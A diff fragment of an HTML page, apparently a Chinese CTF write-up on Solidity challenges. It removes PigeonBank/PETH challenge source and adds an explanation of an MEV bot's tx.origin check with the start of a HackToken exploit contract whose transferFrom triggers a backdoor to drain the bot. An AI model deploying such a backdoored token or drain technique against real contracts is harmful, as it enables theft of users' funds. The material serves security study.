+<span class="w">    </span><span class="nx">pair2</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">dir</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">amount3</span><span class="p">,</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">amount3</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount2</span><span class="p">,</span><span class="w"> </span><span class="nx">dir</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">WETH</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;balance&quot;</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div>
-</details>
-<details class="note">
-<summary>PigeonBank.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.17</span><span class="p">;</span>
-
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span><span class="p">;</span>
-
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./PETH.sol&quot;</span><span class="p">;</span>
-
-<span class="c1">// Deposit Ether to PigeonBank to get PETH</span>
-<span class="c1">// @TODO: Implement interest rate feature so that users can get interest by depositing Ether</span>
-<span class="nx">contract</span><span class="w"> </span><span class="nx">PigeonBank</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ReentrancyGuard</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">Address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">Address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">PETH</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">peth</span><span class="p">;</span><span class="w"> </span><span class="c1">// @dev - Created by the SEE team. Pigeon Bank is created to allow citizens to deposit Ether and get SEETH and earn interest to survive the economic crisis.</span>
-<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
-
-<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">peth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">PETH</span><span class="p">();</span>
-<span class="w">        </span><span class="nx">_owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">nonReentrant</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">peth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">nonReentrant</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">peth</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdrawAll</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">nonReentrant</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">peth</span><span class="p">.</span><span class="nx">withdrawAll</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">nonReentrant</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">peth</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
-<span class="p">}</span>
+</li>
+<li>
+<p><code>uniswapV2Call()</code> 虽然增加了访问控制，但验证的是 <code>tx.origin</code></p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">uniswapV2Call</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;origin&quot;</span><span class="p">);</span>
 </code></pre></div>
-</details>
-<details class="note">
-<summary>PETH.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.17</span><span class="p">;</span>
+</li>
+<li>
+<p>由于题目环境相对固定，可以简单地通过区块号来区分模拟交易和实际套利交易。创建由受控代币和 <code>WETH</code> 组成的交易对，诱使 MEV bot 调用 <code>arbitrage()</code>，并在实际套利交易中调用 <code>uniswapV2Call()</code> 来转出资金</p>
+</li>
+</ul>
+<h4 id="exploitation_1">Exploitation<a class="headerlink" href="#exploitation_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">HackToken</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">name</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hack Token&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">symbol</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;HT&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint8</span><span class="w">  </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">decimals</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">18</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
 
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/access/Ownable.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">bot</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">weth</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">hacked</span><span class="p">;</span>
 
-<span class="nx">contract</span><span class="w"> </span><span class="nx">PETH</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">Address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">Address</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">event</span><span class="w">  </span><span class="nx">Approval</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">event</span><span class="w">  </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
 
-<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Pigeon ETH&quot;</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">symbol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;PETH&quot;</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">uint8</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">decimals</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">18</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w">                       </span><span class="kr">public</span><span class="w">  </span><span class="nx">balanceOf</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">))</span><span class="w">  </span><span class="kr">public</span><span class="w">  </span><span class="nx">allowance</span><span class="p">;</span>
 
-<span class="w">    </span><span class="nx">event</span><span class="w"> </span><span class="nx">Approval</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amt</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">event</span><span class="w"> </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amt</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">event</span><span class="w"> </span><span class="nx">Deposit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amt</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">event</span><span class="w"> </span><span class="nx">Withdrawal</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">indexed</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amt</span><span class="p">);</span>
-
-<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">))</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">allowance</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">revert</span><span class="p">(</span><span class="s2">&quot;PETH: Do not send ETH directly&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">_bot</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_weth</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">weth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_weth</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">bot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_bot</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Deposit</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
-<span class="w">        </span><span class="c1">// return msg.value;</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">).</span><span class="nx">sendValue</span><span class="p">(</span><span class="nx">_wad</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">_burn</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">_wad</span><span class="p">);</span>
-<span class="w">        </span><span class="c1">// require(success, &quot;SEETH: withdraw failed&quot;);</span>
-<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Withdrawal</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">_wad</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdrawAll</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">).</span><span class="nx">sendValue</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">_userAddress</span><span class="p">]);</span>
-<span class="w">        </span><span class="nx">_burnAll</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">);</span>
-<span class="w">        </span><span class="c1">// require(success, &quot;SEETH: withdraw failed&quot;);</span>
-<span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Withdrawal</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">_userAddress</span><span class="p">]);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">totalSupply</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">        </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">guy</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
 <span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Approval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">guy</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
 <span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// transfer() 将在 pair1.swap() 中被调用，即 MEV bot 发送 WETH 之后</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">wad</span><span class="p">)</span>
+<span class="w">        </span><span class="kr">public</span>
+<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">backdoor</span><span class="p">();</span>
 <span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">src</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">src</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">src</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint</span><span class="p">).</span><span class="nx">max</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
 <span class="w">            </span><span class="nx">allowance</span><span class="p">[</span><span class="nx">src</span><span class="p">][</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
 <span class="w">        </span><span class="p">}</span>
@@ -3989,141 +4163,190 @@
 <span class="w">        </span><span class="nx">balanceOf</span><span class="p">[</span><span class="nx">dst</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">wad</span><span class="p">;</span>
 
 <span class="w">        </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="nx">dst</span><span class="p">,</span><span class="w"> </span><span class="nx">wad</span><span class="p">);</span>
-
 <span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_wad</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">_wad</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PETH: wad exceeds balance&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;PETH: Borrower must be a contract&quot;</span><span class="p">);</span>
-
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">userBalanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
-
-<span class="w">        </span><span class="c1">// @dev Send Ether to borrower (Borrower must implement receive() function)</span>
-<span class="w">        </span><span class="nx">Address</span><span class="p">.</span><span class="nx">functionCallWithValue</span><span class="p">(</span><span class="nx">_userAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">_wad</span><span class="p">);</span>
-
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">userBalanceAfter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
-
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">userBalanceAfter</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">userBalanceBefore</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PETH: You did not return my Ether!&quot;</span><span class="p">);</span>
-
